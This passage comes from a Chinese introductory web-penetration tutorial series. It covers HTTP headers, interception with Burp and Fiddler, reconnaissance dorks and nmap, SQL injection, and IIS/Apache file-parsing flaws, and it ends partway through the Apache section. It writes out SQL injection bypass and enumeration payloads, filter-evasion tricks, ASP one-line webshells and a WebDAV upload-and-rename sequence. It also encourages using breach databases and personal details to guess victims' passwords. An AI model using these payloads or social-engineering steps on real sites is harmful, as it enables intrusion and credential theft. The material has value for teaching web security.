<li>WWW-Authenticate：WWW-Authenticate响应报头域必须被包含在401(未授权的)响应消息中，这个报头域和前面讲到的Authorization请求报头域是 相关的，当客户端收到401响应消息，就要决定是否请求服务器对其进行验证。如果要求服务器对其进行验证，就可以发送一个包含了 Authorization报头域的请求，下面是WWW-Authenticate响应报头域的一个例子：WWW-Authenticate: Basic realm=”Basic Auth Test!”</li>
<li>从这个响应报头域，可以知道服务器端对我们所请求的资源采用的是基本验证机制。</li>
<li>Content-Encoding：Content-Encoding实体报头域被使用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容编码，因而要获得Content- Type报头域中所引用的媒体类型，必须采用相应的解码机制。Content-Encoding主要用语记录文档的压缩方法，下面是它的一个例子： Content-Encoding: gzip。如果一个实体正文采用了编码方式存储，在使用之前就必须进行解码。</li>
<li>Content-Language：Content-Language实体报头域描述了资源所用的自然语言。Content-Language允许用户遵照自身的首选语言来识别和区分实体。 如果这个实体内容仅仅打算提供给丹麦的阅读者，那么可以按照如下的方式设置这个实体报头域：Content-Language: da。</li>
<li>如果没有指定Content-Language报头域，那么实体内容将提供给所以语言的阅读者。</li>
<li>Content-Length：Content-Length实体报头域用于指明正文的长度，以字节方式存储的十进制数字来表示，也就是一个数字字符占一个字节，用其对应的ASCII码存储传输。</li>
<li>要注意的是：这个长度仅仅是表示实体正文的长度，没有包括实体报头的长度。</li>
<li>Content-Type :Content-Type实体报头域用语指明发送给接收者的实体正文的媒体类型。例如：</li>
<li>Content-Type: text/html;charset=ISO-8859-1</li>
<li>Content-Type: text/html;charset=GB2312</li>
<li>Last-Modified :Last-Modified实体报头域用于指示资源最后的修改日期及时间。</li>
<li>Expires :Expires实体报头域给出响应过期的日期和时间。通常，代理服务器或浏览器会缓存一些页面。当用户再次访问这些页面时，直接从缓存中加载并显示给用 户，这样缩短了响应的时间，减少服务器的负载。为了让代理服务器或浏览器在一段时间后更新页面，我们可以使用Expires实体报头域指定页面过期的时 间。当用户又一次访问页面时，如果Expires报头域给出的日期和时间比Date普通报头域给出的日期和时间要早(或相同)，那么代理服务器或浏览器就 不会再使用缓存的页面而是从服务器上请求更新的页面。不过要注意，即使页面过期了，也并不意味着服务器上的原始资源在此时间之前或之后发生了改变。</li>
<li>Expires实体报头域使用的日期和时间必须是RFC 1123中的日期格式，例如：</li>
<li>Expires: Thu, 15 Sep 2005 16:00:00 GMTHTTP1.1的客户端和缓存必须将其他非法的日期格式(也包括0)看作已过期。例如，为了让浏览器不要缓存页面，我们也可以利用Expires实体报头 域，设置它的值为0，如下(JSP)：response.setDateHeader(“Expires”,0);</li>
</ul>
<h1 id="第三篇-体验http协议的应用"><a href="#第三篇-体验http协议的应用" class="headerlink" title="第三篇-体验http协议的应用"></a>第三篇-体验http协议的应用</h1><p>之前我们都了解了,访问网页时,客户端与服务端之间的请求与响应数据交互。本篇就浅谈它的应用。</p>
<h2 id="利用HTTP拦截突破前段验证"><a href="#利用HTTP拦截突破前段验证" class="headerlink" title="利用HTTP拦截突破前段验证"></a>利用HTTP拦截突破前段验证</h2><p>比方说,我们在某个网页提交某些数据（例如留言、<a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>、插入xss等）,发生错误（例如提示不支持该文件、您提交的内容非法）</p>
<p>如果提交之后,在原网页发生以上错误,而不是网页跳转之后发出提示。那么很可能网站验证方式是前端验证。</p>
<h3 id="什么是前端验证？"><a href="#什么是前端验证？" class="headerlink" title="什么是前端验证？"></a>什么是前端验证？</h3><p>就是在客户端发送请求,服务器响应后向客户端传输网页（html）和验证脚本（JavaScript）,我们提交内容时候都要经过网站js的验证。</p>
<p>（简单介绍）</p>
<p>而这里的这个js验证就是属于前端验证,也就是客户端验证,它只在客户端作用。</p>
<h3 id="如何突破验证"><a href="#如何突破验证" class="headerlink" title="如何突破验证"></a>如何突破验证</h3><p>这里就要用到工具了</p>
<p>推荐工具:burp、fiddler</p>
<p>这些工具有什么用呢,在这里他们的作用就是能拦截和修改http请求,也就是所谓的<a href="http://www.yuntest.org/archives/tag/zhua-bao/" target="_blank" rel="noopener">抓包</a>。</p>
<p>工具拦截突破过程原理：</p>
<p>1,开启http拦截</p>
<p>2,在网页内提交js判断规则内允许提交的内容</p>
<p>3,此时提交的请求已经被工具拦截了,网页属于堵塞状态,而且我们提交的内容已经被js判断为允许了。</p>
<p>4,在工具内修改拦截的内容（请求内容）</p>
<p>5,发送数据包（接触拦截.正常流通）</p>
<h3 id="如何绕过验证"><a href="#如何绕过验证" class="headerlink" title="如何绕过验证"></a>如何绕过验证</h3><p>同理,在接受响应时拦截包。并删除js验证用的代码</p>
<h3 id="软件的使用"><a href="#软件的使用" class="headerlink" title="软件的使用"></a>软件的使用</h3><p>软件有很多个,小编推荐burp suite是一款很强大的渗透工具。但是由于burp的安装要在JAVA环境,且工具界面内容为英语。而fiddler有汉化版,EXE文件现下现用。小编觉得如果是体验本章的逻辑和应用的话,还是fiddler是个很不错的选择。至于软件的使用,由于时间和本人较懒和条件有限的问题,请参考：<a href="http://m.cr173.com/w/15341" target="_blank" rel="noopener">http://m.cr173.com/w/15341</a></p>
<p>其实教程网上很多的,甚至不需要看教程,Fd摸一下就明白了</p>
<p>如果真的需要或者不懂的,可以在下方评论,小编会抽空录个视频。QQ2780217151</p>
<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>说了那么多,我觉得还是不够,别以为你们看懂了就是看懂了。这东西要多接触,多动手,多实践。介于本篇是说明原理,有些读者可能没有练手的地方。小编决定,在短期内收集和编写一些早期的网站程序源码（漏洞多的源码）,给大家动手实验。</p>
<h1 id="第四篇-Web安全之信息探测"><a href="#第四篇-Web安全之信息探测" class="headerlink" title="第四篇-Web安全之信息探测"></a>第四篇-Web安全之信息探测</h1><p>Web之信息探测,从这篇开始就正式进入了Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a><a href="http://www.yuntest.org/archives/tag/shi-zhan/" target="_blank" rel="noopener">实战</a>过程了,嗯,前面都是讲基础,下面我们来讲Web中的信息探测。</p>
<h2 id="信息探测-主要的目的"><a href="#信息探测-主要的目的" class="headerlink" title="信息探测,主要的目的"></a>信息探测,主要的目的</h2><ul>
<li>收集目标<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>系统信息（IP,服务器所用系统等）</li>
<li>收集目标网站子域名</li>
<li>收集目标服务器开放的端口</li>
<li>搞清楚目标域名信息、目标网站内容管理系统等,因为很多系统都是有漏洞发布过的。</li>
</ul>
<p>在对某目标进行<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>时,有时候这些信息有时候对我们有意想不到的好处。收集好了记得打草稿</p>
<h2 id="利用搜索引擎进行信息探测"><a href="#利用搜索引擎进行信息探测" class="headerlink" title="利用搜索引擎进行信息探测"></a>利用搜索引擎进行信息探测</h2><p>我们没办法把所有的子域名全部找出来，但是我们可以找的只是被搜索引擎收录的域名。利用搜索引擎。推荐谷歌</p>
<ul>
<li>site:域名 如site:baidu.com 搜索该域名下的所有网页</li>
</ul>
<ul>
<li>intitle：<a href="http://www.yuntest.org/archives/tag/hou-tai/" target="_blank" rel="noopener">后台</a><a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a></li>
</ul>
<p>可以把搜索结果限定在网页标题的查询上。</p>
<ul>
<li>intitle：index of</li>
</ul>
<p>可找到很多目录遍历漏洞网站</p>
<p>index of是 <a href="http://www.yuntest.org/archives/tag/web/" target="_blank" rel="noopener">WEB</a>服务器的目录列表，而intitle:index of就是搜索指定网页标题为index of的内容，所以就可以搜索到那些允许目录遍历的服务器内容。</p>
<ul>
<li>inurl：admin</li>
</ul>
<p>搜索查询词出现在url中的页面。</p>
<p>这些都是我们渗透过程中常用的语法,还有更多语法,我们可以把他们互相搭配,达到我们想要的效果。如：</p>
<p>intitle:后台 site:域名</p>
<p>这样可以搜索标题内包含：后台 且域名内包含我们搜索的域名的URL</p>
<h2 id="子域名在线查询工具"><a href="#子域名在线查询工具" class="headerlink" title="子域名在线查询工具"></a>子域名在线查询工具</h2><p>如站长之家域名信息查询</p>
<p>whois查询</p>
<p>“whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。</p>
<p>简单说，whois就是一个用来查询域名是否已经被注册，</p>
<p>以及注册域名的详细信息的<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>（如域名所有人、域名注册商）。</p>
<p>whois查询可以对域名的所有者信息、注册商、域名服务器等信息进行查询</p>
<p>得到简单信息之后我们可以对他进行社工,获取更多信息。比方说用邮箱,去社工库查<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>,去他<a href="http://www.yuntest.org/archives/tag/qqkong-jian/" target="_blank" rel="noopener">QQ空间</a>查信息,以及评论他说说的朋友的信息,加他的QQ含有欺骗,可以无限扩大～谈起社工我就激情澎湃。得到它的名字和生日和手机号码等等等等～用字典生成相关的<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>（读者们中枪没？反正有一些人的密码无非如此）</p>
<h2 id="工具的利用"><a href="#工具的利用" class="headerlink" title="工具的利用"></a>工具的利用</h2><p>我们说过了搜索语法的应用, 但是搜索引擎不是万能的, 做过网站的都知道, 搜索引擎会遵循robots.txt里面的规则,如果robots文件禁止搜索引擎蜘蛛爬指定目录,那么搜索引擎就不会爬。</p>
<p>那我们就要应用到工具了,这里推荐一款工具 nmap  。这个nmap拥有扫描之王的称号。他拥有以下功能：</p>
<ul>
<li>检测活在网络上的主机（主机发现）；</li>
<li>检测主机上开放的端口（端口发现或枚举）；</li>
<li>检测到相应的端口（服务发现）的软件和版本；</li>
<li>检测操作系统，硬件地址，以及软件版本；</li>
<li>检测脆弱性的漏洞（Nmap的脚本）。</li>
</ul>
<h3 id="nmap使用命令："><a href="#nmap使用命令：" class="headerlink" title="nmap使用命令："></a>nmap使用命令：</h3><ul>
<li>nmap 192.168.1.1 扫描目标系统1-10000范围内所开放的端口。</li>
<li>nmap -p1-100 192.168.1.1</li>
</ul>
<p>默认扫描目标1-10000范围内的端口号。-p 可以自定义设置我们要扫描的端口。-p1-100就是扫描1到100的端口。</p>
<ul>
<li>nmap -p80、443、21 192.168.1.1</li>
</ul>
<p>端口指定扫描，指定对一些你需要扫描的端口进行扫描。</p>
<ul>
<li>nmap -sP 192.168.1.1/24</li>
</ul>
<p>扫描整个网段,后面的24是你自己设置的子网掩码</p>
<ul>
<li>nmap -O 192.168.1.1</li>
</ul>
<p>操作系统类型的探测,目标系统操作系统类型的探测</p>
<p>这里我就不一一详谈了,工具我就挑一个推荐给大家,其实还有很多工具。在这里小编就列举几个好用的给大家</p>
<p>\1. Nikto</p>
<p>这是一个开源的Web服务器扫描程序，它可以对Web服务器的多种项目(包括3500个潜在的危险文件/CGI，以及超过900个服务器版本，还有250多个服务器上的版本特定问题)进行全面的<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>。其扫描项目和插件经常更新并且可以自动更新(如果需要的话)。</p>
<p>Nikto可以在尽可能短的周期内<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>你的Web服务器，这在其日志文件中相当明显。不过，如果你想试验一下(或者测试你的IDS系统)，它也可以支持LibWhisker的反IDS方法。</p>
<p>不过，并非每一次检查都可以找出一个<a href="http://www.yuntest.org/archives/tag/an-quan/" target="_blank" rel="noopener">安全</a>问题，虽然多数情况下是这样的。有一些项目是仅提供信息(“info only” )类型的检查，这种检查可以查找一些并不存在安全漏洞的项目，不过Web管理员或安全工程师们并不知道。这些项目通常都可以恰当地标记出来。为我们省去不少麻烦。</p>
<p>\2. Paros proxy</p>
<p>这是一个对Web应用程序的漏洞进行评估的代理程序，即一个基于Java的web代理程序，可以评估Web应用程序的漏洞。它支持动态地编辑/查看<a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>/HTTPS,从而改变cookies和表单字段等项目。它包括一个Web通信记录程序，Web圈套程序(spider)，hash 计算器，还有一个可以测试常见的Web应用程序<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>(如SQL<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>式攻击和跨站脚本攻击)的扫描器。</p>
<p>\3. WebScarab</p>
<p>它可以分析使用HTTP 和HTTPS协议进行通信的应用程序，WebScarab可以用最简单地形式记录它观察的会话，并允许操作人员以各种方式观查会话。如果你需要观察一个基于HTTP(S)应用程序的运行状态，那么WebScarabi就可以满足你这种需要。不管是帮助开发人员调试其它方面的难题，还是允许安全专业人员识别漏洞，它都是一款不错的工具。</p>
<p>\4. WebInspect</p>
<p>这是一款强大的Web应用程序扫描程序。SPI Dynamics的这款应用程序安全评估工具有助于确认Web应用中已知的和未知的漏洞。它还可以检查一个Web服务器是否正确配置，并会尝试一些常见的Web攻击，如参数注入、跨站脚本、目录遍历攻击(directory traversal)等等。</p>
<p>\5. Whisker/libwhisker</p>
<p>Libwhisker是一个Perla模块，适合于HTTP测试。它可以针对许多已知的安全漏洞，测试HTTP服务器，特别是检测危险CGI的存在。Whisker是一个使用libwhisker的扫描程序。</p>
<p>\6. Burpsuite</p>
<p>这是一个可以用于攻击Web应用程序的集成平台。Burp套件允许一个攻击者将人工的和自动的技术结合起来，以列举、分析、攻击Web应用程序，或利用这些程序的漏洞。各种各样的burp工具协同工作，共享信息，并允许将一种工具发现的漏洞形成另外一种工具的基础。</p>
<p>\7. Wikto</p>
<p>可以说这是一个Web服务器评估工具，它可以检查Web服务器中的漏洞，并提供与Nikto一样的很多功能，但增加了许多有趣的功能部分，如后端miner和紧密的Google集成。它为MS.NET<a href="http://www.yuntest.org/archives/tag/huan-jing/" target="_blank" rel="noopener">环境</a>编写，但用户需要注册才能<a href="http://www.yuntest.org/archives/tag/xia-zai/" target="_blank" rel="noopener">下载</a>其二进制文件和源<a href="http://www.yuntest.org/archives/tag/dai-ma/" target="_blank" rel="noopener">代码</a>。</p>
<p>\8. Acunetix Web Vulnerability Scanner</p>
<p>这是一款商业级的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注入、跨站脚本攻击、身份验证页上的<a href="http://www.yuntest.org/archives/tag/ruo-kou-ling/" target="_blank" rel="noopener">弱口令</a>长度等。它拥有一个操作方便的图形用户界面，并且能够创建专业级的Web站点安全审核报告。</p>
<p>\9. Watchfire AppScan</p>
<p>这也是一款商业类的Web漏洞扫描程序。AppScan在应用程序的整个开发周期都提供安全测试，从而测试简化了部件测试和开发早期的安全保证。它可以扫描许多常见的漏洞，如跨站脚本攻击、HTTP响应拆分漏洞、参数篡改、隐式字段处理、<a href="http://www.yuntest.org/archives/tag/hou-men/" target="_blank" rel="noopener">后门</a>/调试选项、缓冲区溢出等等。</p>
<p>\10. N-Stealth</p>
<p>N-Stealth是一款商业级的Web服务器安全扫描程序。它比一些<a href="http://www.yuntest.org/archives/tag/mian-fei/" target="_blank" rel="noopener">免费</a>的Web扫描程序，如Whisker/libwhisker、 Nikto等的升级频率更高，它宣称含有“30000个漏洞和漏洞程序”以及“每天增加大量的漏洞检查”，不过这种说法令人质疑。还要注意，实际上所有通用的VA工具，如Nessus, ISS Internet Scanner, Retina, SAINT, Sara等都包含Web 扫描部件。(虽然这些工具并非总能保持软件更新，也不一定很灵活。)N-Stealth主要为Windows平台提供扫描，但并不提供源<a href="http://www.yuntest.org/archives/tag/dai-ma/" target="_blank" rel="noopener">代码</a>。</p>
<p>工具的好处不仅仅可以扫描目录,还可以对网站的程序脚本进行分析,检测漏洞,还可以直接用工具进行漏洞利用。所以小编在这里特别推荐3个小编特别热爱的工具</p>
<p>1.<a href="http://www.yuntest.org/wp-content/themes/begin/inc/go.php?url=https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;tn=monline_dg&amp;wd=burpsuite%E6%95%99%E7%A8%8B&amp;oq=burpsuite%25E4%25BB%258B%25E7%25BB%258D&amp;rsv_pq=a8fb405100022042&amp;rsv_t=826b%2Fq1k6Wh6fboaI9QattTUK3TV9DGxhBFce9FMaOucB8w05vnF54TKDmEn77DqKg&amp;rqlang=cn&amp;rsv_enter=1&amp;inputT=2216&amp;rsv_sug3=24&amp;rsv_sug1=21&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=2309" target="_blank" rel="noopener">BURP SUITE</a>名副其实web安全工具中排名第一&lt;之前有推荐过&gt;</p>
<p>2.<a href="http://www.yuntest.org/archives/865" target="_blank" rel="noopener">AppScan扫描工具</a></p>
<p>3.<a href="http://www.yuntest.org/archives/160" target="_blank" rel="noopener">JSKY</a></p>
<p>其中第2.3都是中文界面而且安装方便，适合新手。其实软件的功能和效果差不多。不过相对来说国外的工具比我们国内的好很多，特别是nmap、burp suite 。小编建议大家多了解并使用一下国外工具。并且在众多工具中挑选一款合适自己的。</p>
<p>工具的<a href="http://www.yuntest.org/archives/tag/xia-zai/" target="_blank" rel="noopener">下载</a>，可以通过百度下载,也可以在本博客的分类目录里寻找</p>
<h1 id="第五篇-SQL注入的原理"><a href="#第五篇-SQL注入的原理" class="headerlink" title="第五篇-SQL注入的原理"></a>第五篇-SQL注入的原理</h1><p>哈哈哈，讲到注入了。我想给大家讲注入的原理。这个我们前面的前言篇就说过,所谓的SQL注入就是,绕过<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>验证机制直接执行SQL语句。怎么说呢,我们先讲一个概念吧！</p>
<h2 id="网站和网页的区别"><a href="#网站和网页的区别" class="headerlink" title="网站和网页的区别"></a>网站和网页的区别</h2><p>单纯的网页是静态的,html就是静态的,一些简单的网站（如某些<a href="http://www.yuntest.org/archives/tag/yin-dao-ye/" target="_blank" rel="noopener">引导页</a>）只有网页和网页之间的跳转。而网站是动态的,是一个整体性的web应用程序,几乎所有的网站都要用到<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>。数据库我们怎么利用呢？例如某些博客站,cms站点。它的文章并不是存在网站目录里的,而是存在数据库里的,例如某些cms是通过后缀?id=321来调用数据库内的文章内容。此时便是向数据库传递变量为ID值为321请求,而数据库会响应并查询我们的请求。</p>
<p>总体来说原理就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在<a href="http://www.yuntest.org/archives/tag/an-quan/" target="_blank" rel="noopener">安全</a><a href="http://www.yuntest.org/archives/tag/lou-dong/" target="_blank" rel="noopener">漏洞</a>的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>比方说我们在某网站后台<a href="http://www.yuntest.org/archives/tag/deng-lu/" target="_blank" rel="noopener">登录</a>界面,有两条输入框,一条是帐号一条是<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>。那么我们可以猜测数据库中有一个admin表，表里面有两个字段username和password 。这样我们输入用户（比如123）<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>（比如456）并提交之后,数据库就会执行一段查询语句:</p>
<p>select id from users where username = ‘123 and password = ‘123’</p>
<p>并判断用户名123是错误的（为假）</p>
<p>之后返回帐号密码错误信息。</p>
<p>那么如果我们在用户名处输入’or 1=1– 而密码随便输入个456呢？ 我们来看看数据库中的查询语句：</p>
<p>select id from users where username = ‘’ or 1=1–  and password = ‘456’</p>
<p>‘又 这里呢1=1永远为真,后面 and password = ‘456’被注释掉了。数据库不需要考虑,这里我们就跳过了验证。</p>
<p>这就是几年前的万能密码,这里只是说说逻辑。我们再来看看下面另一个例子。</p>
<h2 id="整型参数的判断"><a href="#整型参数的判断" class="headerlink" title="整型参数的判断"></a>整型参数的判断</h2><p>SQL注入一般存在于形如：</p>
<p><a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>://<a href="http://www.xxx.xxx/text.asp?id=XX" target="_blank" rel="noopener">www.xxx.xxx/text.asp?id=XX</a></p>
<p>这种带有参数的asp或者动态网页中，注入又分为整形注入和字符串注入。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。下以HTTP://<a href="http://www.xxx.xxx/test.asp?p=xx为例进行分析，xx此处设为整型。" target="_blank" rel="noopener">www.xxx.xxx/test.asp?p=xx为例进行分析，xx此处设为整型。</a></p>
<p>当输入的参数xx为整型时，通常test.asp中SQL语句原貌大致如下：</p>
<p>select * from 表名 where 字段=xx</p>
<p>所以可以用以下步骤<a href="http://www.yuntest.org/archives/tag/ce-shi/" target="_blank" rel="noopener">测试</a>SQL注入是否存在。</p>
<p>①HTTP://<a href="http://www.xxx.xxx/text.asp?p=xx’(附加一个单引号)此时abc.ASP中的SQL语句变成了" target="_blank" rel="noopener">www.xxx.xxx/text.asp?p=xx’(附加一个单引号)此时abc.ASP中的SQL语句变成了</a></p>
<p>select * from 表名 where 字段=YY’</p>
<p>数据库无法处理,返回异常；</p>
<p>②HTTP://<a href="http://www.xxx.xxx/test.asp?p=xx" target="_blank" rel="noopener">www.xxx.xxx/test.asp?p=xx</a> and 1=1。1=1为真 test.asp运行正常，而且与没加语句之前的test.asp?p=xx运行结果一样正常显示；</p>
<p>③HTTP://<a href="http://www.xxx.xxx/test.asp?p=YY" target="_blank" rel="noopener">www.xxx.xxx/test.asp?p=YY</a> and 1=2,语句为假,因为1≠2  test.asp运行异常；如果以上三步全面满足，test.asp中一定存在SQL注入<a href="http://www.yuntest.org/archives/tag/lou-dong/" target="_blank" rel="noopener">漏洞</a>。</p>
<p>小技巧：有时管理员会在后台设置过滤掉单引号等字符，以防止SQL注入。此时可以用以下几种试一试。</p>
<p>大小定混合法：VBS并不区分大小写，而网站程序可能区分。然后程序员在过滤时通常要么全部过滤大写字符串，要么全部过滤小写字符串，而大小写混合往往会被忽视。如用SelecT代替select,SELECT等；</p>
<p>UNICODE法：在IIS中，以UNICODE字符集实现国际化，我们完全可以IE中输入的字符串化成UNICODE字符串进行输入。如+ =%2B，空格=%20 等；URLEncode信息可以参加百度；</p>
<p>ASCII码法：可以把输入的部分或全部字符全部用ASCII码代替，如U=chr(85),a=chr(97)等，ASCII信息参见百度。</p>
<h2 id="猜解内容"><a href="#猜解内容" class="headerlink" title="猜解内容"></a>猜解内容</h2><p>用过明小子、啊D的都知道,存在注入肯定要猜密码了哈哈哈,可是软件是怎样一个工作过程呢？</p>
<p>猜解表名： and exists (select * from 表名)</p>
<p>猜解列名： and exists (select 字段 from 表</p>
<p>爆指定表名内容： and 1=1 union select 1,2,3,4,5 from 表名</p>
<p>猜解列长度 猜解语句： and (select top 1 len(列名)from 表名)&gt;N and (select top 1 len(列名)from 表名)=N 其中N是数字</p>
<p>变换这个N的值猜解列长度，</p>
<p>例如： and (select top 1 len(列名)from 表名)&gt;1 and (select top 1 len(列名)from 表名)&gt;6</p>
<p>如果一直猜到6都显示正常页面，猜到7的时候返回错误（大于6并且小于等于7），那么该列的长度为7。</p>
<p>阿西巴,我好困～～好了这次注入浅谈就说到这里～ 其实网上的注入<a href="http://www.yuntest.org/archives/tag/gong-ju/" target="_blank" rel="noopener">工具</a>还是挺多的, 如<a href="http://www.yuntest.org/archives/tag/pi-liang/" target="_blank" rel="noopener">批量</a>注入的明小子、啊D注入工具、椰树、御剑等等。现在不会语法也没太大关系,以后再补上也行啊。SQL 存在注入的站点小编在博客里也送过了,大家可以找几个练练手（不要干坏事）。</p>
<p>手机一个一个字打,贼几把累（其实抄了一部分）～要是你们还不懂,明天来问我吧</p>
<h1 id="第六篇-上传漏洞之解析漏洞"><a href="#第六篇-上传漏洞之解析漏洞" class="headerlink" title="第六篇-上传漏洞之解析漏洞"></a>第六篇-上传漏洞之解析漏洞</h1><p><a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>漏洞,我们为什么要<a href="http://www.yuntest.org/archives/tag/shang-chuan/" target="_blank" rel="noopener">上传</a>？因为我们说过。在网站<a href="http://www.yuntest.org/archives/tag/fu-wu-qi/" target="_blank" rel="noopener">服务器</a>上 肯定有一个Web容器,它里面装的就是Web应用程序 。某些脚本具有一定的<a href="http://www.yuntest.org/archives/tag/zhi-xing/" target="_blank" rel="noopener">执行</a>和修改<a href="http://www.yuntest.org/archives/tag/quan-xian/" target="_blank" rel="noopener">权限</a>。这些<a href="http://www.yuntest.org/archives/tag/quan-xian/" target="_blank" rel="noopener">权限</a>可以说是服务器给客户端访问时提供的服务的同时提供的, 提供服务越多, 存在漏洞的几率就越大。</p>
<p>如果我们上传了某个具有对系统进行操作性权限的文件（一句话木马,大马,bat,dll等）,那对于我们接下去的<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>提供了很大的方便。</p>
<p>上面这些我就不多说了 ,之前也讲过了。回归正题, 我们这篇要说的是：</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>在这里我先说一个知识点吧,相信很多人都听说过：一句话木马</p>
<p>（PS:可能这篇结构有点乱～）</p>
<p><a href="http://www.yuntest.org/archives/tag/hei-ke/" target="_blank" rel="noopener">黑客</a>在注册信息的电子邮箱或者个人主页等中插入类似如下<a href="http://www.yuntest.org/archives/tag/dai-ma/" target="_blank" rel="noopener">代码</a>：</p>
<p>&lt;%execute request(“value”)%&gt;</p>
<p>其中value是值（俗称<a href="http://www.yuntest.org/archives/tag/mi-ma/" target="_blank" rel="noopener">密码</a>），你可以更改自己的值，前面的request就是获取这个值</p>
<p>&lt;%eval request(“value”)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)</p>
<p>当知道了<a href="http://www.yuntest.org/archives/tag/shu-ju-ku/" target="_blank" rel="noopener">数据库</a>的URL，就可以利用中国菜刀进行连接得到Webshell,从而拥有读写网站目录的权限（除了部分限权网站,只是简说）。</p>
<p>（不知道数据库也可以，只要知道</p>
<p>&lt;%eval request(“value”)%&gt;</p>
<p>这个文件被插入到哪一个ASP文件里面就可以了）这就被称为一句话木马</p>
<p><a href="http://www.yuntest.org/wp-content/themes/begin/inc/go.php?url=https://wapbaike.baidu.com/item/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/1845646?adapt=1&amp;fr=aladdin" target="_blank" rel="noopener">想了解更多信息看这里</a></p>
<h2 id="逻辑导航"><a href="#逻辑导航" class="headerlink" title="逻辑导航"></a>逻辑导航</h2><p>文件解析漏洞,是指Web容器（Apache、nginx、iis等）在解析文件时出现了漏洞,从而,黑客可以利用该漏洞实现非法文件的解析。</p>
<p>下面就列举早些年存在至今的解析漏洞：</p>
<p>（大家尽量理解概念）</p>
<h2 id="一、IIS解析漏洞"><a href="#一、IIS解析漏洞" class="headerlink" title="一、IIS解析漏洞"></a>一、IIS解析漏洞</h2><p>1.当建立<em>.asa、</em>.asp格式的文件夹时，其目录下的任意文件都将被IIS当作asp文件来解析（如text.asp/1.txt.此处的txt是以ASP文件的影视运行的）</p>
<p>2.当文件为*.asp;1.jpg时，IIS 6.0同样会以ASP脚本来执行。</p>
<p>3.WebDav漏洞（对IIS写权限的利用,这个我们在之前学http请求的时候就说过的请求头和正文语句,这段好好看）</p>
<ul>
<li>第一步，通过OPTIONS探测服务器所支持的<a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>方法</li>
</ul>
<p>请求：</p>
<p>OPTIONS / <a href="http://www.yuntest.org/archives/tag/http/" target="_blank" rel="noopener">HTTP</a>/1.1</p>
<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
<p>响应：</p>
<p>Public:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH</p>
<ul>
<li>第二步，通过PUT方法向服务器上传脚本文件</li>
</ul>
<p>请求：</p>
<p>PUT /a.txt HTTP/1.1</p>
<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
<p>Content-Length:30</p>
<p>&lt;%eval request(“chopper”)%&gt;</p>
<p>第三步，通过Move或Copy方法改名</p>
<p>请求：</p>
<p>COPY /a.txt HTTP/1.1</p>
<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
<p>Destination:<a href="http://www.example.com/cmd.asp" target="_blank" rel="noopener">http://www.example.com/cmd.asp</a></p>
<p>第四步，使用DELETE方法，<a href="http://www.yuntest.org/archives/tag/gong-ji/" target="_blank" rel="noopener">攻击</a>者还可以删除服务器上的任意文件</p>
<p>请求：</p>
<p>DELETE /a.txt HTTP/1.1</p>
<p>Host:<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a></p>
<h2 id="二、Apache解析漏洞"><a href="#二、Apache解析漏洞" class="headerlink" title="二、Apache解析漏洞"></a>二、Apache解析漏洞</h2><p>在Apache 1.x和Apache 2.x中1.php.rar会被当作php文件执行。</p>
<p>Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止。</p>
<p>例 上传文件：</p>
<p>1.php.aa.bb</p>
<p>后缀名bb 不认识,向前解析</p>
<p>1.php.aa</p>
